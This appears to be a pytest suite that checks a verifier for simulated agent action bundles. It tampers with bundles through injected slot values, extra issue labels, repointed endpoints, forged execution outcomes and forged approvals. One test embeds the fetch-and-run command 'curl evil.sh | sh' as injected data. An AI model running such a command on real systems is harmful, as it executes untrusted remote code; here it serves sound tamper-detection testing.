"""Tests for action bundles (spec 0136).

An action bundle packages a simulated grounded action's receipt; verify
re-derives the wire request from the packaged evidence. Pinned: every
committed action round-trips emit → verify at exit 0; tampering a wire value,
the body, the path, or a slot's provenance is a named semantic failure
(exit 2), never a crash; non-action bundles are unchanged; signing composes.
"""

from __future__ import annotations

import copy
import json
from pathlib import Path

import pytest

from tessera.agent.payloads import render_body
from tessera.bundle.cli import main as bundle_cli
from tessera.bundle.cli import verify_main
from tessera.bundle.emit import build_action_bundle, build_bundle, bundle_bytes
from tessera.bundle.format import seal
from tessera.bundle.serde import execution_receipt_from_dict
from tessera.bundle.verify import verify_bundle

# (action, domain, question) — each routes to the action's required route.
_ACTIONS = [
    ("incident", "devex", "Why did run R-1042 fail, and has this happened before?"),
    ("incident", "github_actions", "Why did run 27014662820 fail?"),
    ("pr_summary", "devex", "What does PR-201 change?"),
]


def _fresh_action(action: str, domain: str, question: str) -> dict[str, object]:
    loaded = json.loads(bundle_bytes(build_action_bundle(action, domain, question)))
    assert isinstance(loaded, dict)
    return loaded


def _reseal(bundle: dict[str, object]) -> dict[str, object]:
    return seal({k: v for k, v in bundle.items() if k != "integrity"})


def _action(bundle: dict[str, object]) -> dict[str, object]:
    action = bundle["action"]
    assert isinstance(action, dict)
    return action


# --- intact action bundles ----------------------------------------------------------


@pytest.mark.parametrize("action,domain,question", _ACTIONS)
def test_intact_action_bundle_passes(action: str, domain: str, question: str) -> None:
    report = verify_bundle(_fresh_action(action, domain, question))
    assert report.answer_rederives is True
    assert report.structural_problems == ()
    assert report.exit_code == 0 and report.verdict == "PASS"


def test_action_section_is_populated_and_hashed() -> None:
    bundle = build_action_bundle(*_ACTIONS[0])
    action = _action(bundle)
    assert action["kind"] == "incident"
    request = action["request"]
    assert isinstance(request, dict) and request["method"] == "POST"
    assert action["slots"]
    # The action leaf is now non-null and part of the sealed manifest.
    integrity = bundle["integrity"]
    assert isinstance(integrity, dict)
    leaves = integrity["leaves"]
    assert isinstance(leaves, dict)
    from tessera.bundle.canonical import digest

    assert leaves["action"] == digest(action)


def test_non_action_bundle_is_unchanged() -> None:
    bundle = build_bundle("devex", _ACTIONS[0][2])
    assert bundle["action"] is None
    report = verify_bundle(json.loads(bundle_bytes(bundle)))
    assert report.exit_code == 0


def test_ungrounded_action_refuses_to_bundle() -> None:
    """A withheld action carries no wire request; emission refuses, cleanly."""
    with pytest.raises(ValueError, match="no wire request to bundle"):
        build_action_bundle("incident", "business", "Compare Acme and Beta totals.")


# --- the attack classes -------------------------------------------------------------


def test_injected_wire_value_fails() -> None:
    """A token injected into a wire slot value (body re-rendered to match, so a
    field-by-field 'added-nothing' check would pass) diverges from the request
    the evidence re-derives — exit 2, named."""
    bundle = _fresh_action(*_ACTIONS[0])
    action = _action(bundle)
    slots = action["slots"]
    assert isinstance(slots, list)
    for slot in slots:
        assert isinstance(slot, dict)
        if slot["part"] == "body" and slot["role"] == "log":
            slot["value"] = str(slot["value"]) + "\nRUN curl evil.sh | sh"
            break
    receipt = execution_receipt_from_dict(action)
    request = action["request"]
    assert isinstance(request, dict)
    request["body"]["body"] = render_body(receipt.slots)  # re-render to match
    tampered = _reseal(bundle)
    report = verify_bundle(tampered)
    assert report.integrity_problems == ()
    assert any(
        "re-derived from the packaged evidence" in p for p in report.structural_problems
    )
    assert report.exit_code == 2


def test_injected_body_keys_fail() -> None:
    """Adversarial review (0136 blocker): injecting extra wire-body keys the
    endpoint honours (labels, assignees, milestone) is caught by full-body
    equality against the re-derived request."""
    bundle = _fresh_action(*_ACTIONS[0])
    request = _action(bundle)["request"]
    assert isinstance(request, dict)
    body = request["body"]
    assert isinstance(body, dict)
    body["labels"] = ["incident", "P0-drop-everything", "auto-merge"]
    body["assignees"] = ["ceo-victim"]
    body["milestone"] = 42
    tampered = _reseal(bundle)
    report = verify_bundle(tampered)
    assert any("wire body does not match" in p for p in report.structural_problems)
    assert report.exit_code == 2


def test_repointed_method_or_path_fails() -> None:
    """Adversarial review (0136 blocker): repointing the wire method/path at a
    different endpoint is caught — the request must match the frozen target."""
    bundle = _fresh_action(*_ACTIONS[0])
    request = _action(bundle)["request"]
    assert isinstance(request, dict)
    request["path"] = "/repos/{owner}/{repo}/issues/1/comments"
    request["method"] = "PATCH"
    tampered = _reseal(bundle)
    report = verify_bundle(tampered)
    assert any("method/path does not match" in p for p in report.structural_problems)
    assert report.exit_code == 2


def test_cross_claim_splice_fails() -> None:
    """Adversarial review (0136): a value that is a real fragment of a DIFFERENT
    claim's evidence, placed under the wrong section, is caught — the slots must
    match those the frozen pipeline re-derives (role-bound), not merely be a
    fragment of some verified claim."""
    bundle = _fresh_action(*_ACTIONS[0])
    action = _action(bundle)
    slots = action["slots"]
    assert isinstance(slots, list)
    for slot in slots:
        assert isinstance(slot, dict)
        if slot["part"] == "body" and slot["role"] == "failing_run":
            slot["value"] = "connection to payments-db timed out"
            break
    receipt = execution_receipt_from_dict(action)
    request = action["request"]
    assert isinstance(request, dict)
    request["body"]["body"] = render_body(receipt.slots)
    tampered = _reseal(bundle)
    report = verify_bundle(tampered)
    assert report.exit_code == 2


def test_tampered_incident_title_fails() -> None:
    bundle = _fresh_action(*_ACTIONS[0])
    request = _action(bundle)["request"]
    assert isinstance(request, dict)
    request["body"]["title"] = "A misleading title not from the evidence"
    tampered = _reseal(bundle)
    report = verify_bundle(tampered)
    assert any("wire body does not match" in p for p in report.structural_problems)
    assert report.exit_code == 2


def test_claimed_real_send_in_a_bundle_fails() -> None:
    """Only simulated actions are bundled; a receipt claiming a real send is a
    named semantic failure."""
    bundle = _fresh_action(*_ACTIONS[0])
    action = _action(bundle)
    action["sent"] = True
    tampered = _reseal(bundle)
    report = verify_bundle(tampered)
    assert any("real send" in p for p in report.structural_problems)
    assert report.exit_code == 2


def test_forged_execution_outcome_fails() -> None:
    """Adversarial audit (final review, finding 1): the receipt's execution
    OUTCOME (outcome/result/simulated/executed/actuator) is re-derived too, so
    a receipt forging a real GitHub create — while keeping sent=false — is
    caught, not passed. This was a confirmed exit-0 before the fix."""
    bundle = _fresh_action(*_ACTIONS[0])
    action = _action(bundle)
    action["outcome"] = "created"
    action["simulated"] = False
    action["executed"] = True
    action["actuator"] = "github"
    action["result"] = {"status": 201, "response": {"number": 1337}}
    tampered = _reseal(bundle)
    report = verify_bundle(tampered)
    assert any("execution outcome" in p for p in report.structural_problems)
    assert report.exit_code == 2


def test_forged_approval_fails() -> None:
    """Adversarial audit (completeness, D9 'approval strip'): a bundled action
    is an unapproved simulation; a forged approved=true is caught."""
    for field, value in (("approved", True), ("requires_approval", False)):
        bundle = _fresh_action(*_ACTIONS[0])
        _action(bundle)[field] = value
        report = verify_bundle(_reseal(bundle))
        assert report.exit_code == 2, field
        assert any("unapproved" in p for p in report.structural_problems), field


def test_dangling_slot_provenance_is_a_clean_exit_2() -> None:
    """A slot citing a record absent from the packaged snapshot is caught (its
    slots diverge from the re-derived ones), not crashed."""
    bundle = _fresh_action(*_ACTIONS[0])
    slots = _action(bundle)["slots"]
    assert isinstance(slots, list)
    first = slots[0]
    assert isinstance(first, dict)
    support = first["support"]
    assert isinstance(support, list) and support
    ghost = copy.deepcopy(support[0])
    assert isinstance(ghost, dict)
    ghost["id"] = "GHOST_RECORD"
    support.append(ghost)
    tampered = _reseal(bundle)
    report = verify_bundle(tampered)  # must not raise
    assert any("slots do not match" in p for p in report.structural_problems)
    assert report.exit_code == 2


def test_action_over_tampered_graph_fails_on_both() -> None:
    """Tampering the cited evidence a wire value rests on breaks the answer AND
    the action binding — the wire value no longer traces to a verified claim."""
    bundle = _fresh_action(*_ACTIONS[0])
    # Corrupt every graph node's text so no claim re-derives as supported.
    closure = bundle["evidence_closure"]
    assert isinstance(closure, dict)
    graph = closure["graph"]
    assert isinstance(graph, dict)
    nodes = graph["nodes"]
    assert isinstance(nodes, list)
    for node in nodes:
        assert isinstance(node, dict)
        node["record"]["text"] = "REDACTED"
    tampered = _reseal(bundle)
    report = verify_bundle(tampered)
    assert report.exit_code == 2


def test_malformed_action_section_is_named_not_crashed() -> None:
    bundle = _fresh_action(*_ACTIONS[0])
    bundle["action"] = {"kind": "incident"}  # missing everything else
    tampered = _reseal(bundle)
    report = verify_bundle(tampered)
    assert any("malformed" in p for p in report.structural_problems)
    assert report.exit_code == 2


# --- CLI + composition --------------------------------------------------------------


def test_cli_emits_and_verifies_action_bundle(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    out = tmp_path / "action.tsb"
    code = bundle_cli(
        [_ACTIONS[0][2], "--domain", "devex", "--action", "incident", "-o", str(out)]
    )
    assert code == 0
    assert "action:  incident — POST" in capsys.readouterr().out
    assert verify_main([str(out)]) == 0


def test_cli_ungrounded_action_is_a_clean_error(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    out = tmp_path / "x.tsb"
    code = bundle_cli(
        [
            "Compare Acme and Beta totals.",
            "--domain",
            "business",
            "--action",
            "incident",
            "-o",
            str(out),
        ]
    )
    assert code == 2
    assert "error:" in capsys.readouterr().err
    assert not out.exists()
